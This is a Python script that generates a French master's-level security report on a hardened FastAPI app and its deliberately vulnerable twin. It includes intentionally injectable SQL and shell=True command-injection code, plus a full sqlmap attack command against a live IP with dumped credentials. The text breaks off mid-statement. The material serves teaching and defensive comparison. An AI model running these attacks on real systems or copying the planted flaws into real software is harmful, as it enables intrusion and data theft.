# -*- coding: utf-8 -*-
"""Génère le rapport complet M1SPRO (secure_app vs vuln_app) au format .docx.

Police : Times New Roman partout (corps + titres). Cible : 20+ pages, avec le
détail de CHAQUE attaque (commandes Kali + sorties) et de CHAQUE correctif
(code vulnérable -> code durci).
"""
from docx import Document
from docx.shared import Pt, RGBColor, Inches
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.enum.section import WD_SECTION
from docx.oxml.ns import qn
from docx.oxml import OxmlElement

BLUE = RGBColor(0x1F, 0x4E, 0x79)
RED = RGBColor(0xC0, 0x39, 0x2B)
GREEN = RGBColor(0x1E, 0x7E, 0x34)
GREY = RGBColor(0x55, 0x55, 0x55)
DARK = RGBColor(0x22, 0x22, 0x22)
FONT = "Times New Roman"

doc = Document()

# ---------------------------------------------------------------------------
# Police Times New Roman sur TOUT le document (corps + jeux de styles titres)
# ---------------------------------------------------------------------------
normal = doc.styles["Normal"]
normal.font.name = FONT
normal.font.size = Pt(12)
# Force la police aussi pour les scripts est-asiatiques / complexes (robustesse).
rpr = normal.element.get_or_add_rPr()
rfonts = rpr.get_or_add_rFonts()
rfonts.set(qn("w:ascii"), FONT)
rfonts.set(qn("w:hAnsi"), FONT)
rfonts.set(qn("w:cs"), FONT)

for style_name in ("Heading 1", "Heading 2", "Heading 3", "Title", "List Bullet",
                   "List Number"):
    try:
        st = doc.styles[style_name]
        st.font.name = FONT
        _rpr = st.element.get_or_add_rPr()
        _rf = _rpr.get_or_add_rFonts()
        _rf.set(qn("w:ascii"), FONT)
        _rf.set(qn("w:hAnsi"), FONT)
        _rf.set(qn("w:cs"), FONT)
    except KeyError:
        pass


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def shade(cell, hexcolor):
    tcPr = cell._tc.get_or_add_tcPr()
    sh = OxmlElement("w:shd")
    sh.set(qn("w:val"), "clear")
    sh.set(qn("w:fill"), hexcolor)
    tcPr.append(sh)


def _set_run_font(r, name=FONT):
    r.font.name = name
    rPr = r._element.get_or_add_rPr()
    rf = rPr.get_or_add_rFonts()
    rf.set(qn("w:ascii"), name)
    rf.set(qn("w:hAnsi"), name)
    rf.set(qn("w:cs"), name)


def code_block(text, caption=None):
    """Bloc de code monospace sur fond gris clair (table 1 cellule)."""
    if caption:
        cap = doc.add_paragraph()
        rc = cap.add_run(caption)
        rc.italic = True
        rc.font.size = Pt(10)
        rc.font.color.rgb = GREY
        _set_run_font(rc)
    t = doc.add_table(rows=1, cols=1)
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    cell = t.cell(0, 0)
    shade(cell, "F4F4F4")
    cell.width = Inches(6.3)
    p = cell.paragraphs[0]
    for i, line in enumerate(text.strip("\n").split("\n")):
        if i:
            p.add_run("\n")
        r = p.add_run(line)
        r.font.name = "Consolas"
        r.font.size = Pt(8.5)
    tblPr = t._tbl.tblPr
    borders = OxmlElement("w:tblBorders")
    for edge in ("top", "left", "bottom", "right"):
        e = OxmlElement(f"w:{edge}")
        e.set(qn("w:val"), "single")
        e.set(qn("w:sz"), "4")
        e.set(qn("w:color"), "BBBBBB")
        borders.append(e)
    tblPr.append(borders)
    doc.add_paragraph()


def para(text, italic=False, color=None, bold=False, size=None, align=None):
    p = doc.add_paragraph()
    if align:
        p.alignment = align
    r = p.add_run(text)
    r.italic = italic
    r.bold = bold
    if color:
        r.font.color.rgb = color
    r.font.size = Pt(size) if size else Pt(12)
    _set_run_font(r)
    return p


def bullets(items):
    for it in items:
        p = doc.add_paragraph(style="List Bullet")
        if isinstance(it, tuple):
            r = p.add_run(it[0])
            r.bold = True
            _set_run_font(r)
            r2 = p.add_run(it[1])
            _set_run_font(r2)
        else:
            r = p.add_run(it)
            _set_run_font(r)


def numbered(items):
    for it in items:
        p = doc.add_paragraph(style="List Number")
        if isinstance(it, tuple):
            r = p.add_run(it[0]); r.bold = True; _set_run_font(r)
            r2 = p.add_run(it[1]); _set_run_font(r2)
        else:
            r = p.add_run(it); _set_run_font(r)


def h1(text):
    h = doc.add_heading(text, level=1)
    for r in h.runs:
        r.font.color.rgb = BLUE
        _set_run_font(r)
    return h


def h2(text):
    h = doc.add_heading(text, level=2)
    for r in h.runs:
        r.font.color.rgb = BLUE
        _set_run_font(r)
    return h


def h3(text):
    h = doc.add_heading(text, level=3)
    for r in h.runs:
        r.font.color.rgb = DARK
        _set_run_font(r)
    return h


# =====================================================================
# PAGE DE GARDE (refaite)
# =====================================================================
sec = doc.sections[0]

# Filet supérieur
top = doc.add_paragraph()
top.alignment = WD_ALIGN_PARAGRAPH.CENTER
rt = top.add_run("ÉCOLE IT  —  MASTER 1 CYBERSÉCURITÉ (U3)")
rt.bold = True
rt.font.size = Pt(13)
rt.font.color.rgb = GREY
_set_run_font(rt)

sub = doc.add_paragraph()
sub.alignment = WD_ALIGN_PARAGRAPH.CENTER
rs = sub.add_run("Module « Sécurité en Programmation » — Sessions J1 à J5")
rs.font.size = Pt(12)
rs.font.color.rgb = GREY
_set_run_font(rs)

for _ in range(2):
    doc.add_paragraph()

# Titre principal encadré
box = doc.add_table(rows=1, cols=1)
box.alignment = WD_TABLE_ALIGNMENT.CENTER
bc = box.cell(0, 0)
bc.width = Inches(6.2)
shade(bc, "1F4E79")
bp = bc.paragraphs[0]
bp.alignment = WD_ALIGN_PARAGRAPH.CENTER
r1 = bp.add_run("RAPPORT COMPLET DE PROJET")
r1.bold = True
r1.font.size = Pt(24)
r1.font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
_set_run_font(r1)
bp.add_run("\n")
r2 = bp.add_run("Conception, durcissement et validation offensive\nd'une API REST sécurisée")
r2.font.size = Pt(15)
r2.font.color.rgb = RGBColor(0xDC, 0xE6, 0xF1)
_set_run_font(r2)
# marge interne de la cellule
tcPr = bc._tc.get_or_add_tcPr()
mar = OxmlElement("w:tcMar")
for m in ("top", "bottom"):
    el = OxmlElement(f"w:{m}")
    el.set(qn("w:w"), "220")
    el.set(qn("w:type"), "dxa")
    mar.append(el)
tcPr.append(mar)

doc.add_paragraph()
st = doc.add_paragraph()
st.alignment = WD_ALIGN_PARAGRAPH.CENTER
rst = st.add_run("« secure_app » contre « vuln_app » : démonstration défensive comparée\n"
                 "sur le projet de Honeypot Intelligent multi-services")
rst.italic = True
rst.font.size = Pt(13)
rst.font.color.rgb = BLUE
_set_run_font(rst)

for _ in range(2):
    doc.add_paragraph()

# Bloc identité (tableau encadré 2 colonnes)
info = doc.add_table(rows=6, cols=2)
info.alignment = WD_TABLE_ALIGNMENT.CENTER
info_rows = [
    ("Étudiant", "ANANI Georges Lionel"),
    ("Binôme", "BOHOUSSOU Kouamé Marc"),
    ("Formation", "Master 1 Cybersécurité — U3, École IT"),
    ("Projet", "Honeypot Intelligent M1SPRO + applications jumelles"),
    ("Type de livrable", "Rapport technique de sécurité applicative"),
    ("Date", "10 juin 2026"),
]
for i, (k, v) in enumerate(info_rows):
    c0 = info.cell(i, 0)
    c1 = info.cell(i, 1)
    c0.width = Inches(1.9)
    c1.width = Inches(4.0)
    shade(c0, "DCE6F1")
    pk = c0.paragraphs[0]
    rk = pk.add_run(k)
    rk.bold = True
    rk.font.size = Pt(12)
    _set_run_font(rk)
    pv = c1.paragraphs[0]
    rv = pv.add_run(v)
    rv.font.size = Pt(12)
    _set_run_font(rv)
# bordures du tableau identité
tblPr = info._tbl.tblPr
borders = OxmlElement("w:tblBorders")
for edge in ("top", "left", "bottom", "right", "insideH", "insideV"):
    e = OxmlElement(f"w:{edge}")
    e.set(qn("w:val"), "single")
    e.set(qn("w:sz"), "4")
    e.set(qn("w:color"), "9DB7D4")
    borders.append(e)
tblPr.append(borders)

for _ in range(2):
    doc.add_paragraph()

foot = doc.add_paragraph()
foot.alignment = WD_ALIGN_PARAGRAPH.CENTER
rf = foot.add_run("Document à diffusion restreinte — contient la description d'attaques\n"
                  "menées exclusivement sur l'infrastructure des auteurs (cadre pédagogique).")
rf.italic = True
rf.font.size = Pt(10)
rf.font.color.rgb = GREY
_set_run_font(rf)

doc.add_page_break()

# =====================================================================
# SOMMAIRE
# =====================================================================
h1("Sommaire")
toc = [
    "1.  Introduction, contexte et objectifs pédagogiques",
    "2.  Méthodologie : le principe des applications jumelles",
    "      2.1  Modèle de menaces et couverture OWASP Top 10",
    "3.  Architecture générale du système",
    "      3.1  La plateforme de honeypots multi-services",
    "4.  secure_app — l'application durcie (mesure par mesure)",
    "5.  vuln_app — le jumeau volontairement vulnérable",
    "6.  Le coffre à secrets et le chiffrement au repos (AES-256-GCM)",
    "7.  Refonte graphique des interfaces (IHM)",
    "8.  Campagne d'attaque offensive depuis Kali Linux (détaillée)",
    "      8.1  Injection SQL (sqlmap)",
    "      8.2  Injection de commandes / RCE (/tools/ping)",
    "      8.3  JWT alg:none (forge de jeton)",
    "      8.4  Brute-force du login (ffuf)",
    "      8.5  Fuite de secrets en clair",
    "9.  Synthèse comparative attaque / défense",
    "10. Détail des correctifs défensifs (code vulnérable → code durci)",
    "11. Chaîne DevSecOps et intégration continue (CI/CD)",
    "      11.3 Sécurité mémoire — lab buffer-overflow (J2)",
    "12. Corrections apportées au pipeline d'intégration",
    "13. Tests et validation",
    "14. Conclusion et perspectives",
    "15. Annexes (cadre légal, démontage, environnement)",
]
for line in toc:
    p = doc.add_paragraph()
    r = p.add_run(line)
    r.font.size = Pt(12)
    _set_run_font(r)
doc.add_page_break()

# =====================================================================
# 1. INTRODUCTION
# =====================================================================
h1("1. Introduction, contexte et objectifs pédagogiques")
para(
    "Ce rapport documente le volet « Sécurité en Programmation » du projet intégrateur "
    "M1SPRO réalisé en binôme. L'objectif pédagogique est de démontrer, de manière concrète, "
    "mesurable et reproductible, l'écart de sécurité entre une application développée selon "
    "les bonnes pratiques de l'état de l'art et une application reproduisant les vulnérabilités "
    "classiques du Top 10 OWASP."
)
para(
    "Le parti pris méthodologique est celui des « applications jumelles » : deux services "
    "exposant exactement la même surface fonctionnelle (authentification, gestion de notes, "
    "coffre à secrets, outil réseau de diagnostic), mais dont l'un — secure_app — applique "
    "chaque mesure défensive, tandis que l'autre — vuln_app — retire volontairement ces "
    "protections. Les mêmes attaques, menées depuis une machine Kali Linux, sont ensuite "
    "rejouées contre les deux cibles : la seule variable étant la qualité défensive du code et "
    "de son environnement d'exécution, l'écart de résultat isole précisément la valeur de chaque "
    "contre-mesure."
)
h2("1.1 Objectifs détaillés")
numbered([
    "Concevoir une API REST sécurisée appliquant la défense en profondeur (couche entrée, "
    "authentification, autorisation, transport, exécution, supervision).",
    "Construire un jumeau vulnérable fidèle, servant de témoin négatif et de cible "
    "d'entraînement offensif.",
    "Mener une campagne d'attaque réaliste avec l'outillage standard de Kali (sqlmap, ffuf, "
    "forge de jetons) et en capturer les preuves.",
    "Industrialiser le contrôle qualité/sécurité via une chaîne DevSecOps (SAST, DAST, scan "
    "d'images, tests, smoke-test boîte noire).",
    "Restituer, dans le présent rapport, l'analyse comparée attaque/défense et la justification "
    "de chaque correctif.",
])
h2("1.2 Périmètre couvert (programme J1 → J5)")
bullets([
    ("J1 — Injections : ", "neutralisation des injections SQL et des injections de commandes "
     "système (A03:2021)."),
    ("J2 — Sécurité mémoire : ", "illustration de la classe buffer-overflow sur un lab C dédié "
     "(canari de pile, version bornée durcie), prouvée en CI."),
    ("J3 — Authentification & secrets : ", "Argon2id, JWT signé avec liste blanche d'algorithmes, "
     "MFA TOTP, chiffrement des secrets au repos."),
    ("J4 — Sécurité des API : ", "anti-BOLA/IDOR, rate limiting, en-têtes de sécurité, CORS strict, "
     "durcissement du conteneur."),
    ("J5 — DevSecOps : ", "SAST (Bandit, Semgrep), DAST (OWASP ZAP), scan d'image (Trivy), CI/CD "
     "et gestion des secrets de production."),
])

# =====================================================================
# 2. METHODOLOGIE
# =====================================================================
h1("2. Méthodologie : le principe des applications jumelles")
para(
    "La démonstration repose sur une expérience contrôlée. Pour qu'une comparaison soit "
    "scientifiquement honnête, il faut que tout soit identique entre les deux cibles, sauf la "
    "variable étudiée. Ici, la variable est la rigueur défensive."
)
bullets([
    ("Surface fonctionnelle identique : ", "mêmes routes (/auth, /users, /notes, /secrets, "
     "/tools/ping), mêmes schémas de données, mêmes comptes de démonstration (alice, bob)."),
    ("Données de départ identiques : ", "un « seed » idempotent insère, au premier démarrage, "
     "les mêmes utilisateurs, notes et secrets dans les deux bases."),
    ("Déploiement identique : ", "les deux applications tournent en conteneur Docker sur le même "
     "droplet, derrière le même type d'exposition réseau."),
    ("Seule différence : ", "secure_app applique les contre-mesures ; vuln_app les retire, avec "
     "un commentaire de code précisant à chaque endroit la faille plantée et le jour concerné."),
])
para(
    "Cette symétrie rend chaque résultat interprétable sans ambiguïté : lorsqu'une même requête "
    "sqlmap dumpe la table users d'un côté et se heurte à un « not injectable » de l'autre, "
    "l'unique explication est la présence (ou l'absence) de requêtes paramétrées.",
    italic=True, color=GREY,
)

h2("2.1 Modèle de menaces et couverture OWASP Top 10")
para(
    "Le périmètre défensif a été cadré à partir du référentiel OWASP Top 10 (2021). Le tableau "
    "ci-dessous met en correspondance chaque grande catégorie de risque, la manière dont vuln_app "
    "l'expose, et la contre-mesure appliquée dans secure_app."
)
owasp = doc.add_table(rows=1, cols=3)
owasp.style = "Light Grid Accent 1"
owasp.alignment = WD_TABLE_ALIGNMENT.CENTER
oh = owasp.rows[0].cells
for i, txt in enumerate(["Catégorie OWASP", "Exposition (vuln_app)", "Contre-mesure (secure_app)"]):
    rr = oh[i].paragraphs[0].add_run(txt)
    rr.bold = True
    rr.font.size = Pt(10)
    _set_run_font(rr)
owasp_rows = [
    ("A01 — Broken Access Control", "BOLA sur /notes et /secrets ; /secrets/export sans auth",
     "Filtrage par owner_id, 404 anti-oracle"),
    ("A02 — Cryptographic Failures", "mots de passe et secrets en clair",
     "Argon2id + AES-256-GCM (HKDF)"),
    ("A03 — Injection", "SQLi (f-string), RCE (/tools/ping shell=True)",
     "Requêtes paramétrées, shell=False + validation"),
    ("A05 — Security Misconfiguration", "aucune en-tête, docs exposées, conteneur root",
     "8 en-têtes, docs off en prod, conteneur durci"),
    ("A07 — Auth Failures", "JWT non vérifié (alg:none), pas de MFA, brute-force libre",
     "Whitelist HS256, MFA TOTP, rate limiting"),
    ("A09 — Logging Failures", "stack traces renvoyées au client",
     "Erreurs génériques, trace côté serveur uniquement"),
]
for r in owasp_rows:
    cells = owasp.add_row().cells
    for i, val in enumerate(r):
        rr = cells[i].paragraphs[0].add_run(val)
        rr.font.size = Pt(9)
        _set_run_font(rr)
doc.add_paragraph()

# =====================================================================
# 3. ARCHITECTURE
# =====================================================================
h1("3. Architecture générale du système")
para(
    "Le projet est organisé en mono-dépôt (monorepo) orchestré par Docker Compose. Au-delà des "
    "deux applications jumelles, l'écosystème comprend une plateforme de honeypots multi-services "
    "et une chaîne d'analyse et de visualisation."
)
bullets([
    ("Honeypots multi-services : ", "SSH (asyncssh), HTTP (FastAPI), FTP (pyftpdlib) et Telnet, "
     "qui leurrent l'attaquant et journalisent ses actions selon un schéma d'événements commun."),
    ("Analyzer : ", "API d'ingestion, classifieur d'événements et enrichisseurs, persistant les "
     "événements normalisés dans PostgreSQL."),
    ("secure_app : ", "API REST sécurisée (FastAPI), conteneur durci, exposée en permanence sur "
     "le port 8001."),
    ("vuln_app : ", "jumeau vulnérable, exposé temporairement sur le port 8002 pour la seule "
     "durée de la démonstration."),
    ("Observabilité : ", "PostgreSQL + Grafana, avec un dashboard « Comparatif secure vs vuln » "
     "alimenté par une télémétrie de type middleware (table app_requests)."),
    ("CI/CD : ", "GitHub Actions — lint, SAST, tests, DAST et scan d'images à chaque push."),
])
para(
    "Déploiement de référence : droplet DigitalOcean (64.226.106.122). secure_app y tourne en "
    "permanence ; vuln_app n'est allumé que le temps de la démonstration, puis éteint et son "
    "port refermé — une cible volontairement trouée n'est jamais laissée exposée sur Internet.",
    italic=True, color=GREY,
)

h2("3.1 La plateforme de honeypots multi-services")
para(
    "Le cœur historique du projet est une plateforme de honeypots : des services leurres qui "
    "imitent des serveurs réels pour attirer les attaquants, capturer leurs tentatives et nourrir "
    "la chaîne d'analyse. Chaque service émet des événements normalisés selon un contrat "
    "JSON Schema commun (validé en CI)."
)
bullets([
    ("SSH (asyncssh) : ", "faux serveur SSH journalisant les identifiants tentés et les commandes "
     "saisies, sans jamais donner d'accès réel."),
    ("HTTP (FastAPI) : ", "faux service web exposant des routes appétantes (formulaires, fichiers "
     "« sensibles ») pour piéger les scanners."),
    ("FTP (pyftpdlib) : ", "faux serveur FTP avec de faux fichiers-appâts (dont de faux secrets "
     "volontaires)."),
    ("Telnet : ", "quatrième service leurre, ciblant les botnets IoT."),
    ("Analyzer : ", "ingère les événements, les classe (B14, matrice de confusion évaluée en CI) "
     "et les enrichit avant persistance PostgreSQL."),
])
para(
    "Remarque DevSecOps : les honeypots contiennent par nature de faux secrets-appâts. Le scan "
    "Trivy est donc configuré en mode vulnérabilités uniquement (scanners=vuln), pour conserver "
    "le gate « CVE CRITICAL » sans déclencher de faux positifs sur ces leurres volontaires.",
    italic=True, color=GREY,
)

# =====================================================================
# 4. SECURE_APP
# =====================================================================
h1("4. secure_app — l'application durcie (mesure par mesure)")
para(
    "secure_app est une API REST FastAPI construite via une fabrique create_app(), organisée en "
    "package (routers, schémas Pydantic, repository d'accès aux données, primitives de sécurité, "
    "configuration centralisée). Elle applique une défense en profondeur, couche par couche, "
    "détaillée ci-dessous."
)

h2("4.1 Validation d'entrée stricte (anti-injection, J1)")
bullets([
    "Schémas Pydantic avec extra=\"forbid\" : tout champ inattendu est rejeté (anti "
    "mass-assignment).",
    "Validateurs en liste blanche pour les noms d'utilisateur et la robustesse des mots de passe.",
    "Requêtes SQL 100 % paramétrées (aucune concaténation de chaîne) : l'injection SQL est "
    "rendue structurellement impossible.",
    "Outil /tools/ping : validation de l'hôte (adresse IP valide ou nom d'hôte whitelisté) PUIS "
    "exécution sans shell (subprocess shell=False, liste d'arguments), neutralisant l'injection "
    "de commandes.",
])
code_block(
    "# repository.py — accès aux données : le paramètre est lié, jamais concaténé.\n"
    "def get_user_by_username(conn, username):\n"
    "    row = conn.execute(\n"
    "        \"SELECT id, username, email, password_hash, mfa_secret, mfa_enabled \"\n"
    "        \"FROM users WHERE username = ?\",   # <- placeholder paramétré\n"
    "        (username,),                          # <- valeur liée par le driver\n"
    "    ).fetchone()\n"
    "    return dict(row) if row else None",
    caption="Requête paramétrée : le moteur SQLite traite « username » comme une donnée, jamais "
            "comme du code.",
)

h2("4.2 Authentification forte (J3)")
bullets([
    ("Argon2id : ", "hachage des mots de passe mémoire-hard (vainqueur de la Password Hashing "
     "Competition 2015), résistant aux attaques GPU/ASIC. Jamais de MD5/SHA1/SHA256 nu."),
    ("JWT HS256 avec liste blanche d'algorithmes : ", "au décodage, un seul algorithme est "
     "accepté ; un jeton alg:none forgé est rejeté (parade à l'attaque de confusion d'algorithme)."),
    ("Jetons à durée courte : ", "access bref + refresh plus long, avec rotation du refresh et "
     "révocation par jti (blacklist) au logout."),
    ("MFA TOTP (RFC 6238) : ", "second facteur activable, compatible Google Authenticator."),
    ("Réponses génériques : ", "le login ne révèle jamais si c'est l'identifiant ou le mot de "
     "passe qui est faux (pas d'oracle d'énumération)."),
    ("Secret fail-closed : ", "sans SECURE_APP_SECRET_KEY (≥ 32 caractères), l'application refuse "
     "de démarrer en production — aucun secret par défaut exploitable."),
])
code_block(
    "# security.py — décodage JWT : whitelist stricte + claims obligatoires.\n"
    "payload = jwt.decode(\n"
    "    token,\n"
    "    settings.secret_key,\n"
    "    algorithms=[settings.jwt_algorithm],   # HS256 UNIQUEMENT (anti alg:none)\n"
    "    options={\n"
    "        \"verify_signature\": True,\n"
    "        \"verify_exp\": True,\n"
    "        \"require\": [\"exp\", \"sub\", \"jti\", \"type\"],\n"
    "    },\n"
    ")",
    caption="L'anti-pattern jwt.decode(..., algorithms=[\"HS256\", \"none\"]) est explicitement "
            "proscrit.",
)

h2("4.3 Autorisation — anti-BOLA / IDOR (J4)")
para(
    "BOLA (Broken Object Level Authorization), en tête de l'OWASP API Top 10, consiste à accéder "
    "à l'objet d'un autre utilisateur en manipulant son identifiant. La parade est de filtrer "
    "chaque ressource par propriétaire au niveau de la requête elle-même."
)
code_block(
    "# repository.py — la note n'est lue QUE si elle appartient à l'utilisateur.\n"
    "row = conn.execute(\n"
    "    \"SELECT id, owner_id, title, body, created_at \"\n"
    "    \"FROM notes WHERE id = ? AND owner_id = ?\",   # double condition\n"
    "    (note_id, owner_id),\n"
    ").fetchone()\n"
    "# -> si la note appartient à autrui : aucune ligne -> 404 (et non 403),\n"
    "#    pour ne même pas confirmer l'existence de la ressource.",
    caption="Le filtre owner_id rend l'IDOR inopérant ; le 404 évite l'oracle d'existence.",
)

h2("4.4 Rate limiting (anti brute-force, J4)")
para(
    "Le login est protégé par un limiteur à fenêtre glissante en mémoire (Redis recommandé en "
    "production multi-instances). Au-delà du quota, la réponse est un code 429 — y compris pour "
    "une combinaison par ailleurs valide, ce qui casse toute rafale automatisée."
)

h2("4.5 Durcissement du périmètre HTTP (J4)")
bullets([
    ("En-têtes de sécurité : ", "X-Content-Type-Options, X-Frame-Options, Referrer-Policy, "
     "Cross-Origin-Opener-Policy, Cross-Origin-Resource-Policy, Content-Security-Policy, "
     "Permissions-Policy, HSTS (en prod), Cache-Control: no-store."),
    ("CORS en liste blanche : ", "origines explicitement autorisées, jamais « * » avec "
     "credentials."),
    ("Gestion d'erreurs générique : ", "aucune stack trace ni détail interne renvoyé au client ; "
     "la trace est journalisée côté serveur uniquement."),
    ("Documentation désactivée en prod : ", "/docs, /redoc et /openapi.json ne sont pas exposés "
     "en production."),
])

h2("4.6 Durcissement du conteneur (J5)")
bullets([
    "Utilisateur non-root (1000:1000) dans le conteneur.",
    "cap_drop ALL : suppression de toutes les capacités Linux superflues.",
    "no-new-privileges : interdiction d'élévation de privilèges.",
    "Système de fichiers racine en lecture seule (seul un volume de données est inscriptible).",
    "Secret applicatif injecté par variable d'environnement (jamais en dur dans l'image).",
])

# =====================================================================
# 5. VULN_APP
# =====================================================================
h1("5. vuln_app — le jumeau volontairement vulnérable")
para(
    "vuln_app reproduit la même surface d'API mais retire chaque mitigation. Le code est "
    "abondamment commenté pour indiquer, à chaque endroit, la faille plantée et le jour du "
    "programme concerné. Cette application ne doit JAMAIS être déployée durablement ni exposée "
    "au-delà de la démonstration.", color=RED, bold=True,
)
bullets([
    ("Injection SQL : ", "la requête de login est construite par concaténation de chaînes "
     "(f-string) — toute la table users devient extractible."),
    ("Injection de commandes : ", "/tools/ping exécute subprocess.run(cmd, shell=True) sur une "
     "f-string incluant l'entrée utilisateur — exécution de code arbitraire."),
    ("Authentification cassée : ", "mots de passe stockés en clair ; signature JWT jamais "
     "vérifiée (jeton alg:none accepté) ; aucun MFA."),
    ("BOLA / IDOR : ", "/notes/{id} et /secrets/{id} ne vérifient pas le propriétaire."),
    ("Secrets en clair : ", "le coffre stocke les valeurs sans chiffrement ; une route "
     "/secrets/export dumpe tous les secrets de tous les comptes sans authentification."),
    ("Aucun rate limiting : ", "brute-force illimité, jamais de 429."),
    ("Fuite d'information : ", "/users/me renvoie le mot de passe ; les erreurs renvoient la "
     "stack trace ; aucune en-tête de sécurité ; documentation API exposée ; conteneur en root."),
])
code_block(
    "# vuln_app/main.py (EXTRAIT VOLONTAIREMENT VULNÉRABLE — NE PAS REPRODUIRE)\n"
    "# VULN J1 : injection SQL par concaténation\n"
    "q = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\n"
    "row = conn.execute(q).fetchone()    # alice' -- contourne le mot de passe\n"
    "\n"
    "# VULN J1 : injection de commandes\n"
    "cmd = f\"ping -c 1 {data.host}\"\n"
    "proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)  # RCE\n"
    "return {\"output\": proc.stdout + proc.stderr, \"cmd\": cmd}",
    caption="Témoin négatif : ces deux motifs sont exactement ceux que secure_app neutralise.",
)

# =====================================================================
# 6. COFFRE A SECRETS
# =====================================================================
h1("6. Le coffre à secrets et le chiffrement au repos (AES-256-GCM)")
para(
    "Une fonctionnalité de coffre à secrets a été ajoutée aux deux applications afin d'illustrer "
    "de façon spectaculaire la notion de chiffrement au repos et de contrôle d'accès par "
    "propriétaire. Des comptes (alice, bob) et des secrets de démonstration sont insérés "
    "automatiquement au premier démarrage (seed idempotent)."
)
h2("6.1 Côté secure_app — chiffrement authentifié AES-256-GCM")
bullets([
    "Chaque valeur est chiffrée en AES-256-GCM (AEAD : confidentialité ET intégrité "
    "authentifiée) AVANT écriture sur disque : la base ne contient que du ciphertext.",
    "La clé de chiffrement est dérivée de la clé maître applicative via HKDF-SHA256, avec un "
    "label de séparation de domaine — les sous-clés JWT et coffre restent indépendantes.",
    "La liste ne renvoie qu'un aperçu masqué ; la valeur en clair n'est révélée qu'au "
    "propriétaire, et uniquement à la demande, sur l'endpoint de détail.",
    "Contrôle d'accès systématique : la lecture du secret d'autrui renvoie 404 (anti-BOLA).",
])
code_block(
    "# crypto.py — dérivation de clé (HKDF) + chiffrement AEAD (AES-256-GCM).\n"
    "_INFO = b\"secure_app/secrets/v1\"   # label HKDF (séparation de domaine)\n"
    "\n"
    "def _key():\n"
    "    master = get_settings().secret_key.encode()\n"
    "    return HKDF(algorithm=SHA256(), length=32, salt=None, info=_INFO).derive(master)\n"
    "\n"
    "def encrypt(plaintext):\n"
    "    aes = AESGCM(_key())\n"
    "    nonce = os.urandom(12)                      # 96 bits, recommandé GCM\n"
    "    ct = aes.encrypt(nonce, plaintext.encode(), None)\n"
    "    return base64.urlsafe_b64encode(nonce + ct).decode()   # nonce||ct||tag",
    caption="Même un vol complet de la base SQLite ne livre que du chiffré inexploitable sans la "
            "clé applicative.",
)
para(
    "Conséquence directe : un dump par injection SQL (comme celui obtenu sur vuln_app au §8.1) ne "
    "donnerait, côté secure_app, qu'une colonne value_enc illisible.", bold=True, color=GREEN,
)
h2("6.2 Côté vuln_app — tout en clair et dumpable")
bullets([
    "Les valeurs sont stockées en clair ; la liste les renvoie directement (disclosure).",
    "L'endpoint GET /secrets/{id} ne vérifie pas le propriétaire (BOLA).",
    "L'endpoint GET /secrets/export renvoie, SANS authentification, l'intégralité des secrets de "
    "tous les comptes — matérialisant le pire scénario de fuite.",
])

# =====================================================================
# 7. REFONTE GRAPHIQUE
# =====================================================================
h1("7. Refonte graphique des interfaces (IHM)")
para(
    "Les deux applications disposent désormais d'une interface web multi-pages auto-portée "
    "(chaque front est le client de sa propre API), pensée pour la démonstration côte à côte "
    "devant le jury."
)
bullets([
    ("Pages : ", "accueil, connexion, inscription, espace personnel (tableau de bord) et coffre."),
    ("Barre de navigation responsive : ", "menu hamburger animé en vue mobile, adaptation au "
     "statut d'authentification, lien direct vers le coffre."),
    ("Pied de page : ", "trois colonnes (présentation, navigation, sécurité), injecté de façon "
     "centralisée par un script commun."),
    ("Thème : ", "bleu sobre « durci » pour secure_app ; thème rouge « danger » avec bandeau "
     "d'avertissement permanent et panneau de fuite pour vuln_app."),
])
para(
    "Point de sécurité notable : l'IHM de secure_app est servie sous une Content-Security-Policy "
    "stricte (script-src 'self', style-src 'self', sans 'unsafe-inline'). Le front est donc "
    "construit intégralement via createElement / textContent (jamais innerHTML), ce qui élimine "
    "par construction la classe de failles XSS par injection de balise.",
    italic=True, color=GREY,
)
para(
    "Note d'implémentation : la route API GET /secrets masquait la page HTML du coffre. La page "
    "a donc été servie sur /coffre dans les deux applications, et la navigation comme le pied de "
    "page pointent vers cette URL.", italic=True, color=GREY,
)

# =====================================================================
# 8. CAMPAGNE D'ATTAQUE (DÉTAILLÉE)
# =====================================================================
h1("8. Campagne d'attaque offensive depuis Kali Linux")
para(
    "Une campagne offensive a été menée en conditions réelles (cibles déployées en production sur "
    "le droplet), avec l'outillage standard de Kali Linux — et non de simples requêtes curl. "
    "Chaque attaque est rejouée contre les deux cibles pour comparer leur comportement."
)
para("Mise en place des variables d'environnement de la session offensive :")
code_block(
    "SECURE=http://64.226.106.122:8001     # cible durcie\n"
    "VULN=http://64.226.106.122:8002       # cible vulnérable (éphémère)"
)
para("Outils Kali utilisés : sqlmap, commix, ffuf, python3 (forge de JWT), wget. Aucune "
     "dépendance à curl.", italic=True, color=GREY)

# ---- 8.1 SQLi ----
h2("8.1 Injection SQL (sqlmap)")
h3("Cible vulnérable → table users dumpée")
para("Commande sqlmap (boolean-based blind, on ignore les 401 de test) :")
code_block(
    "sqlmap -u \"$VULN/auth/login\" --method POST \\\n"
    "  --headers=\"Content-Type: application/json\" \\\n"
    "  --data='{\"username\":\"alice*\",\"password\":\"x\"}' \\\n"
    "  --dbms=sqlite --ignore-code=401 \\\n"
    "  --technique=B --threads=1 --time-sec=2 \\\n"
    "  --flush-session --batch --level=5 --risk=3 \\\n"
    "  --dump -T users"
)
para("Résultat — injection confirmée et dump intégral de la table :")
code_block(
    "Parameter: JSON #1* ((custom) POST)\n"
    "    Type: boolean-based blind\n"
    "    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - comment)\n"
    "    Payload: {\"username\":\"alice%' OR NOT 9856=9856-- Jzlt\",\"password\":\"x\"}\n"
    "\n"
    "Database: <current>\n"
    "Table: users [2 entries]\n"
    "+--------------------------------------+---------+-------------------+----------+\n"
    "| id                                   | email   | password          | username |\n"
    "+--------------------------------------+---------+-------------------+----------+\n"
    "| 5af32ffe-8a24-4acc-8675-e8b02fd66f89 | a@x.com | Sup3r-S3cret!Pass | alice    |\n"
    "| c31deeec-ff1d-48c5-9c56-decaae8fff9e | b@x.com | Sup3r-S3cret!Pass | bob      |\n"
    "+--------------------------------------+---------+-------------------+----------+"
)
para(
